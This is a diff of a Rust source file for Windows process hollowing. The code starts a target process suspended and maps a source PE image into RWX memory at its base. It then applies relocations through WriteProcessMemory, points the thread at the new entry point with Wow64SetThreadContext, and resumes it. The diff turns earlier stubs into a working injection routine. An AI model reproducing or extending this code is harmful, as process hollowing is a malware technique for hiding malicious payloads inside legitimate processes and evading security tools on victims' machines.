@@ -13,23 +13,34 @@ use crate::pe::{
 use anyhow::*;
 use ntapi::ntmmapi:: NtUnmapViewOfSection;
 use winapi::shared::{
-    ntdef::{ BOOLEAN, HANDLE, ULONG },
-    minwindef::{ LPCVOID, PUCHAR, UCHAR }
+    ntdef::{ BOOLEAN, HANDLE, PVOID, ULONG },
+    minwindef::{ DWORD, LPCVOID, PUCHAR, UCHAR }
 };
 use winapi::um::{
     memoryapi::{ VirtualAllocEx, ReadProcessMemory, WriteProcessMemory },
-    processthreadsapi::{ CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION },
-    winbase::CREATE_SUSPENDED,
-    winnt:: { IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_SECTION_HEADER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE }
+    processthreadsapi::{
+        CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, ResumeThread,
+        GetThreadContext, SetThreadContext
+    },
+    winbase:: {
+        CREATE_SUSPENDED,
+        Wow64GetThreadContext, Wow64SetThreadContext
+    },
+    winnt:: {
+        IMAGE_DIRECTORY_ENTRY_BASERELOC, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+        CONTEXT, WOW64_CONTEXT, CONTEXT_INTEGER, WOW64_CONTEXT_INTEGER
+    }
 };
 
-use std::{fs::File, mem::size_of};
+use std::fs::File;
 use std::ffi::CString;
-use std::mem::zeroed;
+use std::mem::{ size_of, zeroed };
 use std::io::prelude::*;
 use std::ptr::null_mut;
 
 const STATUS_SUCCESS: i32 = 0x0;
+
+// ".reloc" binary
 const DOT_RELOC: [u8; 8] = [46, 114, 101, 108, 111, 99, 0, 0];
 
 #[repr(C)]
@@ -38,15 +49,25 @@ struct BASE_RELOCATION_BLOCK {
     BlockSize: u32,
 }
 
+/*
 bitfield! {
     struct BASE_RELOCATION_ENTRY([u8]);
     impl Debug;
     u8;
-    //u16, offset, _: 11, 0;
-    //u8, block_type, _: 15, 12;
     u8, block_type, _: 3, 0;
     u16, offset, _: 15, 4;
 }
+
+// */
+///*
+bitfield! {
+    struct BASE_RELOCATION_ENTRY([u8]);
+    impl Debug;
+    u8;
+    u16, offset, _: 11, 0;
+    u8, block_type, _: 15, 12;
+}
+// */
 
 pub unsafe fn hollow(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
     // Create dest process
@@ -58,8 +79,8 @@ pub unsafe fn hollow(src: impl Into<String>, dest: impl Into<String>) -> Result<
 
     // Get dest image, image_address
     let hp = process_info.hProcess;
-    let dest_image_address = get_image_base_address(hp);
-    let dest_image = read_remote_image64(hp, dest_image_address)?;
+    let mut dest_image_address = get_image_base_address(hp);
+    let dest_image = read_remote_image32(hp, dest_image_address)?;
 
     // TODO: remove debug print
     println!("dest Signature: {:?}", (*dest_image.FileHeader).Signature);
@@ -82,7 +103,7 @@ pub unsafe fn hollow(src: impl Into<String>, dest: impl Into<String>) -> Result<
     // and need to pass buffer[0], not buffer. becase &buffer is Vec struct pointer.
     // arg pointer should be buffer's first pointer so
     // btw, "&mut buffer[0] as *const _ as *mut _" is ugly, i have to change better code...
-    let src_image = read_image64(&mut buffer[0] as *const _ as *mut _);
+    let src_image = read_image32(&mut buffer[0] as *const _ as *mut _);
     println!("src Signature: {:?}", (*src_image.FileHeader).Signature);
     println!("src Machine: {:?}", (*src_image.FileHeader).FileHeader.Machine);
     println!("src Architecture: {:?}", x96_check(&mut buffer[0]));
@@ -94,21 +115,27 @@ pub unsafe fn hollow(src: impl Into<String>, dest: impl Into<String>) -> Result<
 
     // Allocate memory for src program
     let src_nt_header = *src_image.FileHeader;
-    let dest_image_memory = VirtualAllocEx(
+    let new_dest_image_address = VirtualAllocEx(
         hp, dest_image_address as *mut _, src_nt_header.OptionalHeader.SizeOfImage as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
     );
-    if dest_image_memory as usize == 0x0 {
+    if new_dest_image_address as usize == 0x0 {
         bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.")
     };
+
+    println!("old dest image memory: {:?}", dest_image_address);
+    println!("new dest image memory: {:?}", new_dest_image_address);
+    println!("src image memory: 0x{:x}", src_nt_header.OptionalHeader.ImageBase);
+
+    dest_image_address = new_dest_image_address;
 
     // Delta relocation
     let delta = dest_image_address as usize - src_nt_header.OptionalHeader.ImageBase as usize;
     // TODO: remove debug print
     println!("Source image base: 0x{:x}", src_nt_header.OptionalHeader.ImageBase);
-    println!("Destination image base: {:?}", dest_image_memory);
+    println!("Destination image base: {:?}", new_dest_image_address);
     println!("Relocation delta: 0x{:x}", delta);
 
-    (*src_image.FileHeader).OptionalHeader.ImageBase = dest_image_address as u64;
+    (*src_image.FileHeader).OptionalHeader.ImageBase = dest_image_address as u32;
     // TODO: remove debug print
     println!("Changed source image base: 0x{:x}", (*src_image.FileHeader).OptionalHeader.ImageBase);
 
@@ -145,6 +172,15 @@ pub unsafe fn hollow(src: impl Into<String>, dest: impl Into<String>) -> Result<
             //if memcmp(&section.Name as *const _, &DOT_RELOC as *const _, DOT_RELOC.len()) > 0  { continue }
             if section.Name != DOT_RELOC { continue }
 
+            // TODO: remove debug print
+            //println!(".reloc VirtualAddress: 0x{:x}", section.VirtualAddress);
+            //println!(".reloc SizeOfRawData: 0x{:x}", section.SizeOfRawData);
+            //println!(".reloc PointerToRawData: 0x{:x}", section.PointerToRawData);
+            //println!(".reloc PointerToRelocations: 0x{:x}", section.PointerToRelocations);
+            //println!(".reloc PointerToLinenumbers: 0x{:x}", section.PointerToLinenumbers);
+            //println!(".reloc NumberOfRelocations: 0x{:x}", section.NumberOfRelocations);
+            //println!(".reloc NumberOfLinenumbers: 0x{:x}", section.NumberOfLinenumbers);
+
             // rebase image flow
             let reloc_address = section.PointerToRawData;
             let mut offset = 0;
@@ -152,8 +188,10 @@ pub unsafe fn hollow(src: impl Into<String>, dest: impl Into<String>) -> Result<
 
             while offset < reloc_data.Size {
                 let block_header = std::ptr::read::<BASE_RELOCATION_BLOCK>(&mut buffer[(reloc_address + offset) as usize] as *const _ as *mut _);
-                println!("base reloc addr: {}", block_header.PageAddress);
-                println!("base reloc size: {}", block_header.BlockSize);
+
+                // TODO: remove debug print
+                //println!("base reloc addr: 0x{:x}", block_header.PageAddress);
+                //println!("base reloc size: 0x{:x}", block_header.BlockSize);
 
                 offset = offset + std::mem::size_of::<BASE_RELOCATION_BLOCK>() as u32;
 
@@ -164,41 +202,63 @@ pub unsafe fn hollow(src: impl Into<String>, dest: impl Into<String>) -> Result<
                 let block_entry = std::slice::from_raw_parts::<[u8; 2]>(&mut buffer[(reloc_address + offset) as usize] as *const _ as *mut _, entry_count as usize);
 
                 for block in block_entry {
+                    // TODO: remove debug print
+                    //println!("block: 0x{:x}, 0x{:x}", block[0], block[1]);
                     let block = BASE_RELOCATION_ENTRY(*block);
                     // TODO: remove debug print
-                    println!("block type: {:?}", block.block_type());
-                    println!("block offset: 0x{:x}", block.offset());
+                    //println!("block type: {:?}", block.block_type());
+                    //println!("block offset: 0x{:x}", block.offset());
 
                     offset = offset + 2;
 
                     if block.block_type() == 0 { continue }
 
                     let field_address = block_header.PageAddress + block.offset() as u32;
-                    println!("page address: 0x{:x}", block_header.PageAddress);
-                    println!("field_address: 0x{:x}", field_address);
+                    //println!("page address: 0x{:x}", block_header.PageAddress);
+                    //println!("field_address: 0x{:x}", field_address);
 
-                    let mut d_buffer = zeroed::<u32>();
+                    let mut d_buffer = 0;
 
                     // failed for now, i dont know
-                    /*
+                    ///*
                     if ReadProcessMemory(
-                        hp, (dest_image_address as u32 + field_address) as LPCVOID,
-                        &mut d_buffer as *const _ as *mut _, size_of::<u32>(), null_mut()) != 1 {
-                        bail!("could not read process memory.");
+                        hp, (dest_image_address as u32 + field_address) as PVOID,
+                        &mut d_buffer as *const _ as *mut _, size_of::<u32>(), null_mut()) == 0 {
+                            bail!("could not read memory from new dest image.")
                     }
-                    println!("d_buffer: {:?}", d_buffer);
+
                     d_buffer = d_buffer + delta as u32;
-                    */
+                    // */
+
+                    if WriteProcessMemory(
+                        hp, (dest_image_address as u32 + field_address) as PVOID,
+                        &mut d_buffer as *const _ as *mut _, size_of::<u32>(), null_mut()) == 0 {
+                            bail!("could not write memory to new dest image.")
+                    }
                 }
             }
         }
     }
 
-    // TODO: Get thread context of dest, and modify entry point
-    if false { unimplemented!() }
+    // create context, and change entry point
+    let entry_point = dest_image_address as u32 + (*src_image.FileHeader).OptionalHeader.AddressOfEntryPoint;
+    let mut context = zeroed::<WOW64_CONTEXT>();
+    context.ContextFlags = WOW64_CONTEXT_INTEGER;
+    
+    if Wow64GetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
+        bail!("could not get thread context.");
+    }
 
-    // TODO: Resume thread of dest
-    if false { unimplemented!() }
+    context.Eax = entry_point;
+
+    if Wow64SetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
+        bail!("could not set thread context.");
+    }
+
+    // TODO: Resume thread
+    if ResumeThread(process_info.hThread) <= 0 as DWORD {
+        bail!("could not set thread context.");
+    }
 
     // TODO: remove debug print
     println!("process was hollowed ε٩(๑> 3 <)۶з");
